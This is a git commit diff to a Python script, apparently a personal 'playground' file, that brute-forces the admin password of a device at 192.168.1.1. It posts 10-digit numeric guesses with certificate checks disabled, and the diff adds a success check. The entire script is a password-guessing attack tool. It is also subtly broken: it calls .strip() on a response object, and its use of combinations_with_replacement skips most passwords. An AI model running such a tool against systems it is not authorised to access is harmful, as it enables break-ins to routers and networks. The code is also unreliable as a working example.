ecec28da4be909856088a0001ebdb6dd8ad4e826
Jasmine Fan <lyspfan@gmail.com>
2026-04-21 19:51:08 -0400

    yup

--- playground/login.py
+++ playground/login.py
@@ -6,14 +6,19 @@ def main():
     url = 'https://192.168.1.1'
     digits = '0123456789'
     passwds = itertools.combinations_with_replacement(digits, 10)
+    needle = "login success?" # check this
     # digalps = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'
     # passwds = itertools.combinations_with_replacement(digalps, 10)
     for pwd in passwds:
         if len(set(pwd)) <= 4:
             continue
         pwd = ''.join(pwd)
+        print(f"attempting password: {pwd}")
         creds = { 'admin': pwd }
-        x = requests.post(url, json = creds, verify=False)
+        reply = requests.post(url, json = creds, verify=False)
+        if needle.strip() in reply.strip():
+            print(f"valid password found! it is: {pwd}")
+            break
 
 if __name__ == "__main__":
     main()
